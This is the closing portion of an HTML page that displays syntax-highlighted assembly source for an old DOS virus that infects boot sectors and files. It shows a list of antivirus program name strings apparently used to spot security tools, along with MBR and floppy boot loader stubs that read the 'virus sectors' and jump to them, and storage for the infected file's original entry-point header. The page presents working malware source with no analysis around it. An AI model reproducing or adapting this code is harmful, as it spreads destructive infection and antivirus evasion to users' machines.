                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">av_strings</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"CHKD"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"F-"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"VIR"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc3">"SCAN "</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc3">"CLEAN"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"VSHI"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"ITAV"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"SKUD"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"AVIR"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"MSAV"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"CPAV"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"VSAF"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"VWAT"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NAV"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"THS"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"TB"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"VI-"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"FLU"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"?ATP"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; end of AV and such strings</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"DOO"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"WOLF"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"QUA"</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; two zeros as end of all</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; strings</span><span class="sc0">


</span><span class="sc1">; standard starting part for both floppy boot and mbr</span><span class="sc0">
</span><span class="sc5">generic_boot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">; set SS:SP as usual</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; and make AX=DS=ES=0</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">generic_boot_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; standard mbr part</span><span class="sc0">
</span><span class="sc5">mbr_part</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">                 </span><span class="sc1">; read 8 virus sectors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">                </span><span class="sc1">; to 0:7e00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; starting from</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; store on stack for later</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">; read sectors</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jump there</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc2">07e0h</span><span class="sc0">
</span><span class="sc5">mbr_part_end</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; standard floppy boot part</span><span class="sc0">
</span><span class="sc5">floppy_part</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">                 </span><span class="sc1">; read 8 virus sectors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">                </span><span class="sc1">; to 0:7e00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5102h</span><span class="sc0">                </span><span class="sc1">; starting from</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; store on stack for later</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">; read sectors</span><span class="sc0">
</span><span class="sc5">infnty</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">infnty</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jump there</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc2">07e0h</span><span class="sc0">
</span><span class="sc5">floppy_part_end</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; here are the 1ah bytes from the original file</span><span class="sc0">
</span><span class="sc5">original_file</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">9090h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">original_ss</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">
</span><span class="sc5">original_sp</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">
</span><span class="sc5">original_ip</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">
</span><span class="sc5">original_cs</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">

</span><span class="sc5">temp_memory</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; temp space for infactions</span><span class="sc0">

</span><span class="sc5">check_by</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">fname_dx</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">fname_ds</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">payload_byte</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">the_24h</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">what_call</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">temp_memend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">seg_a</span><span class="sc0">       </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span></div></body>
</html>
